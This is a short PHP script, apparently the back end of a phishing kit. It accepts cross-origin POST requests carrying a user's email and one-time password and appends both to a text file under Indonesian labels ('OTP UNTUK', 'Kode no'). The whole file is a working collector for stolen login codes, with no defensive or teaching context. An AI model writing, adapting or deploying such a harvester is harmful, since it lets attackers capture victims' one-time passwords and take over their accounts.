<?php
header('Access-Control-Allow-Origin:*');
header('Access-Control-Allow-Headers:*');
// USE THIS TO SENDING 

$email = $_POST['user'];
$otp = $_POST['otp'];

$myfile = fopen("isi.text", "a") or die("Unable to open file!");
$txt = "=== OTP UNTUK [ $email ] === \n\n";
fwrite($myfile, $txt);
$txt = "Kode no : $otp \n\n ";
fwrite($myfile, $txt);
$txt = "====================== \n\n";
fwrite($myfile, "-".$txt);
fclose($myfile);

?>